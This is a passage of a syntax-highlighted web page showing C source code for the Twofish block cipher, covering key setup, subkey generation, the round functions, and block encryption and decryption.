class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Expand Key Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">key_t</span>* expand_key(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Galois Field Multiplication Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @param   y</span></span><br><span class="line"><span class="comment"> * @param   m</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> gf(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Generate Subkeys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_key</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">subkey_t</span>* Twofish_generate_subkey(<span class="keyword">key_t</span>* tf_key);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish h Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   x[]</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   stage</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> y[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   y[]</span></span><br><span class="line"><span class="comment"> * @param   out[]</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended K Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   p</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_k_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Genrate Extended S Keys Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   tf_subkey</span></span><br><span class="line"><span class="comment"> * @param   k</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_s_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish f Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   r</span></span><br><span class="line"><span class="comment"> * @param   r0, r1</span></span><br><span class="line"><span class="comment"> * @param   f0, f1</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish g Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   x</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span> Twofish_g(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_setup(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Expand the key if necessary. */</span></span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = expand_key(s, len/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generate subkeys: s and k */</span></span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = Twofish_generate_subkey(tf_key);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/* Generate 40 K keys */</span></span><br><span class="line">    <span class="keyword">twofish_t</span>* tf_twofish = (<span class="keyword">twofish_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">twofish_t</span>));</span><br><span class="line">    tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,<span class="number">0x01010101</span>,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line">    <span class="comment">/* Generate 4x256 S keys */</span></span><br><span class="line">    tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free memory */</span></span><br><span class="line">    release(tf_key-&gt;k, tf_key, tf_subkey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^pack(data);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^pack(data+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^pack(data+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^pack(data+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = ror((f0^r2), <span class="number">1</span>);</span><br><span class="line">        c3 = (f1^rol(r3,<span class="number">1</span>));</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^c3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cypher[i]   = unpack(r0,i);</span><br><span class="line">        cypher[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        cypher[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        cypher[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> t0, t1, o;</span><br><span class="line">    t0 = Twofish_g(tf_twofish, r0);</span><br><span class="line">    t1 = rol(r1, <span class="number">8</span>);</span><br><span class="line">    t1 = Twofish_g(tf_twofish, t1);</span><br><span class="line">    o = <span class="number">2</span>*r;</span><br><span class="line">    *f0= (t0 + t1 + tf_twofish-&gt;k[o+<span class="number">8</span>]);</span><br><span class="line">    *f1= (t0 + (<span class="number">2</span>*t1) + tf_twofish-&gt;k[o+<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_k_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a, b;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>], z[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">40</span>;i+=<span class="number">2</span>)                  <span class="comment">/* i = 40/2 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        a = (i*p);                          <span class="comment">/* 2*i*p */</span></span><br><span class="line">        b = (a+p);                          <span class="comment">/* ((2*i +1)*p */</span></span><br><span class="line">        u(x,a);</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;me, k);</span><br><span class="line">        Twofish_mds_mul(y,z);</span><br><span class="line">        a = pack(z);                        <span class="comment">/* Convert four bytes z[4] to a word (a). */</span></span><br><span class="line">        u(x,b);                             <span class="comment">/* Convert a word (b) to four bytes x[4]. */</span></span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;mo, k);</span><br><span class="line">        Twofish_mds_mul(y,z);        </span><br><span class="line">        b = pack(z);</span><br><span class="line">        b = rol(b,<span class="number">8</span>);</span><br><span class="line">        tf_twofish-&gt;k[i] = ((a + b));</span><br><span class="line">        tf_twofish-&gt;k[i+<span class="number">1</span>] = rol(((a + (<span class="number">2</span>*b))),<span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">twofish_t</span>* Twofish_generate_ext_s_keys(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        x[<span class="number">0</span>] = x[<span class="number">1</span>] = x[<span class="number">2</span>] = x[<span class="number">3</span>] = i;</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;s, k);</span><br><span class="line">        <span class="comment">/* Special MDS multiplication */</span></span><br><span class="line">        tf_twofish-&gt;s[<span class="number">0</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">0</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">1</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">1</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">2</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">2</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">3</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">3</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* MDS multiplication */</span></span><br><span class="line">    out[<span class="number">0</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">0</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">1</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">1</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">2</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">2</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">3</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">3</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Twofish_g(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (tf_twofish-&gt;s[<span class="number">0</span>][unpack(x,<span class="number">0</span>)]^tf_twofish-&gt;s[<span class="number">1</span>][unpack(x, <span class="number">1</span>)]^tf_twofish-&gt;s[<span class="number">2</span>][unpack(x,<span class="number">2</span>)]^tf_twofish-&gt;s[<span class="number">3</span>][unpack(x,<span class="number">3</span>)]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> out[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">4</span>;++j)</span><br><span class="line">    &#123;</span><br><span class="line">        y[j] = x[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">3</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">0</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">3</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">3</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">3</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stage &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">0</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">2</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out[<span class="number">0</span>] = q[<span class="number">1</span>][q[<span class="number">0</span>][ q[<span class="number">0</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">1</span>][<span class="number">0</span>])] ^ (s[<span class="number">0</span>][<span class="number">0</span>])];</span><br><span class="line">    out[<span class="number">1</span>] = q[<span class="number">0</span>][q[<span class="number">0</span>][ q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">1</span>][<span class="number">1</span>])] ^ (s[<span class="number">0</span>][<span class="number">1</span>])];</span><br><span class="line">    out[<span class="number">2</span>] = q[<span class="number">1</span>][q[<span class="number">1</span>][ q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">1</span>][<span class="number">2</span>])] ^ (s[<span class="number">0</span>][<span class="number">2</span>])];</span><br><span class="line">    out[<span class="number">3</span>] = q[<span class="number">0</span>][q[<span class="number">1</span>][ q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">1</span>][<span class="number">3</span>])] ^ (s[<span class="number">0</span>][<span class="number">3</span>])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">subkey_t</span>* Twofish_generate_subkey(<span class="keyword">key_t</span>* tf_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> k, r, g;</span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = (<span class="keyword">subkey_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">subkey_t</span>));</span><br><span class="line">    k = tf_key-&gt;len/<span class="number">8</span>;                                  <span class="comment">/* k=N/64 */</span></span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;k;++r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Generate subkeys Me and Mo */</span></span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span>    );</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">1</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">2</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">3</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">4</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">5</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">6</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">7</span>);</span><br><span class="line">        </span><br><span class="line">        g=k-r<span class="number">-1</span>;                                        <span class="comment">/* Reverse order */</span></span><br><span class="line">        <span class="comment">/* Generate subkeys S using RS matrix */</span></span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">0</span>] = rsm(r, <span class="number">0x01</span>, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">1</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x56</span>, <span class="number">0x82</span>, <span class="number">0xf3</span>, <span class="number">0x1e</span>, <span class="number">0xc6</span>, <span class="number">0x68</span>, <span class="number">0xe5</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">2</span>] = rsm(r, <span class="number">0x02</span>, <span class="number">0xa1</span>, <span class="number">0xfc</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0xae</span>, <span class="number">0x3d</span>, <span class="number">0x19</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">3</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>, <span class="number">0x03</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_subkey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">key_t</span>* expand_key(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">/* Pad factor */</span></span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">16</span>)       n = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> 